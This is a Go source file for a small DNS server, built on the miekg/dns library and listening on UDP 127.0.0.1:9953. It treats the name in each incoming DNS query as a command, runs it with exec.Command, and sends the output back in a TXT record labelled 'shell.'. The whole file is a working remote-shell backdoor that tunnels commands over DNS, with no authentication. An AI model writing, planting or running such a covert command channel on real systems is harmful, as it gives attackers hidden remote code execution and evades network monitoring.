package main

import (
	"log"
	"os/exec"
	"strings"

	"github.com/miekg/dns"
)

func main() {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", func(w dns.ResponseWriter, m *dns.Msg) {
		firstQ := m.Question[0].Name
		normalizedQ := strings.TrimSuffix(firstQ, ".")
		log.Printf("got question: %s", normalizedQ)
		cmd := exec.Command(normalizedQ)
		stdout, err := cmd.Output()
		if err != nil {
			log.Fatalf("shell exec output err: %s", err.Error())
		}
		msg := &dns.Msg{
			Compress: false,
			Answer: []dns.RR{
				&dns.TXT{
					Txt: []string{string(stdout)},
					Hdr: dns.RR_Header{
						Name:   "shell.",
						Rrtype: dns.TypeTXT,
						Ttl:    3600,
						Class:  dns.ClassINET,
					},
				},
			},
		}
		msg.SetReply(m)
		w.WriteMsg(msg)
	})

	server := dns.Server{
		Addr:    "127.0.0.1:9953",
		Net:     "udp",
		Handler: mux,
	}
	log.Println("listening....")
	err := server.ListenAndServe()

	if err != nil {
		log.Fatalf("err: %s", err.Error())
	}
	defer server.Shutdown()
}
